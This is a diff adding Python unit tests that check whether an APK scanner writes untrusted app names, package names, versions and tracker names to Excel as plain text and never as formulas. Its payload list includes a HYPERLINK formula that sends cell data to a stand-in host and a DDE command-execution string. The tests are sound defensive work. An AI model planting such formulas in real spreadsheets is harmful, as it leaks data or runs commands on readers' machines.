@@ -154,6 +154,94 @@ class TestWriteResults(unittest.TestCase):
                 os.unlink(output_tmp)
 
 
+class TestFormulaInjection(unittest.TestCase):
+    """Untrusted strings from APKs must never become Excel formulas."""
+
+    PAYLOADS = [
+        '=HYPERLINK("https://evil.example/?"&A1,"Click")',
+        "+cmd|' /C calc'!A0",
+        "-1+1",
+        "@SUM(1+1)",
+    ]
+
+    def _write(self, results, input_path=None):
+        import openpyxl
+        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
+            out = f.name
+        os.unlink(out)
+        self.addCleanup(lambda: os.path.exists(out) and os.unlink(out))
+        write_results(results, out, input_path=input_path)
+        return out, openpyxl.load_workbook(out).active
+
+    def _assert_text_cell(self, cell, expected):
+        self.assertEqual(cell.value, expected)
+        self.assertEqual(cell.data_type, "s")
+        self.assertTrue(cell.quotePrefix, f"quotePrefix not set for {expected!r}")
+
+    def _assert_no_formulas(self, path):
+        import zipfile
+        with zipfile.ZipFile(path) as z:
+            sheets = [n for n in z.namelist() if n.startswith("xl/worksheets/sheet")]
+            for name in sheets:
+                self.assertNotIn("<f>", z.read(name).decode())
+
+    def test_app_name_payloads_written_as_text(self):
+        results = [
+            ScanResult(apk_path="a.apk", package_name="com.example.app", app_name=p)
+            for p in self.PAYLOADS
+        ]
+        out, ws = self._write(results)
+        self._assert_no_formulas(out)
+        for row_idx, payload in enumerate(self.PAYLOADS, 2):
+            self._assert_text_cell(ws.cell(row=row_idx, column=1), payload)
+
+    def test_hyperlink_written_as_text(self):
+        payload = self.PAYLOADS[0]
+        out, ws = self._write([ScanResult(apk_path="a.apk", app_name=payload)])
+        self._assert_no_formulas(out)
+        self._assert_text_cell(ws["A2"], payload)
+
+    def test_plus_cmd_written_as_text(self):
+        _, ws = self._write([ScanResult(apk_path="a.apk", app_name="+cmd")])
+        self._assert_text_cell(ws["A2"], "+cmd")
+
+    def test_minus_expression_written_as_text(self):
+        _, ws = self._write([ScanResult(apk_path="a.apk", app_name="-1+1")])
+        self._assert_text_cell(ws["A2"], "-1+1")
+
+    def test_all_string_columns_protected(self):
+        result = ScanResult(
+            apk_path="a.apk",
+            package_name="=pkg()",
+            app_name="",
+            version_name="=version()",
+        )
+        result.trackers = [TrackerFound(package="com.x", name="=tracker()")]
+        out, ws = self._write([result])
+        self._assert_no_formulas(out)
+        self._assert_text_cell(ws["A2"], "=pkg()")   # app_name falls back to package
+        self._assert_text_cell(ws["B2"], "=pkg()")
+        self._assert_text_cell(ws["D2"], "=version()")
+        self._assert_text_cell(ws["J2"], "=tracker()")
+
+    def test_augment_mode_protected(self):
+        input_tmp = _make_xlsx([{"Package Name": "com.example.app"}])
+        self.addCleanup(os.unlink, input_tmp)
+        result = ScanResult(apk_path="a.apk", package_name="com.example.app")
+        result.trackers = [TrackerFound(package="com.x", name="=tracker()")]
+        out, ws = self._write([result], input_path=input_tmp)
+        self._assert_no_formulas(out)
+        self._assert_text_cell(ws.cell(row=2, column=7), "=tracker()")
+
+    def test_safe_values_unchanged(self):
+        result = _make_result()
+        _, ws = self._write([result])
+        self.assertEqual(ws["A2"].value, "Test App")
+        self.assertFalse(ws["A2"].quotePrefix)
+        self.assertEqual(ws["E2"].value, result.score)
+        self.assertEqual(ws["E2"].data_type, "n")
+
+
 class TestExcelRow(unittest.TestCase):
 
     def test_excel_row_defaults(self):
